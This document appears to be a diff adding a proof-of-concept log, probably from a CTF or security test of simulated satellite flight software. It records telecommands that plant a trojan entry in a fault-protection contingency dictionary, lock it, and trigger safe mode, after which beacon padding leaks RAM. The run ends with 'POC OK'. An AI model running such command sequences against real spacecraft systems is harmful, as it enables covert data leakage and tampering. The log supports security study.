@@ -1,0 +1,166 @@
+[   0.000] ========================================================================
+[   0.000] V-20 FDIR contingency dictionary trojan
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x1D via=usb AES  payload=0600
+[   0.000] <-- TM apid=0x1D clear len=8
+[   0.000] entry0: apid=0x04 payload=000000
+[   0.000] --> TC apid=0x1D via=usb AES  payload=050200210101
+[   0.001] <-- TM apid=0x1D clear len=6
+[   0.001] entry2 := APID 0x21 (PADDING_CONFIG) payload 01 -> leak padding
+[   0.001] --> TC apid=0x1D via=usb AES  payload=07
+[   0.001] <-- TM apid=0x1D clear len=12
+[   0.001] lock hash=dac2a7937206ad18 locked=1
+[   0.001] --> TC apid=0x1D via=usb AES  payload=050200040100
+[   0.001] <-- TM apid=0x1D clear len=6
+[   0.001] --> TC apid=0x1D via=radio AES  payload=02
+[   0.002] <-- TM apid=0x21 clear len=6
+[   0.002] <-- TM apid=0x1D clear len=4
+[   0.002] --> TC apid=0x05 via=usb clear payload=01
+[   0.002] --> advance(3000 ms)
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] <-- TM apid=0x01 clear len=64
+[   0.002] after safe entry beacon padding mode=1 -> 0000000000000000... (RAM leak active)
+[   0.002] --> advance(122000 ms)
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x08 clear len=20
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=8
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x0E clear len=30
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x08 clear len=20
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x3FF clear len=14
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=8
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x08 clear len=20
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x0E clear len=30
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x08 clear len=20
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x3FF clear len=14
+[   0.005] <-- TM apid=0x01 clear len=8
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x0E clear len=30
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x08 clear len=20
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=8
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x08 clear len=20
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x0E clear len=30
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x3FF clear len=14
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x08 clear len=20
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=8
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x0E clear len=30
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x08 clear len=20
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x3FF clear len=14
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=8
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x08 clear len=20
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] <-- TM apid=0x01 clear len=64
+[   0.005] --> TC apid=0x1D via=usb clear payload=03
+[   0.005] <-- TM apid=0x1D clear len=4
+[   0.005] --> TC apid=0x0C via=usb clear payload=-
+[   0.005] <-- TM apid=0x0C clear len=27
+[   0.005] ========================================================================
+[   0.005] POC OK
+[   0.005] ========================================================================
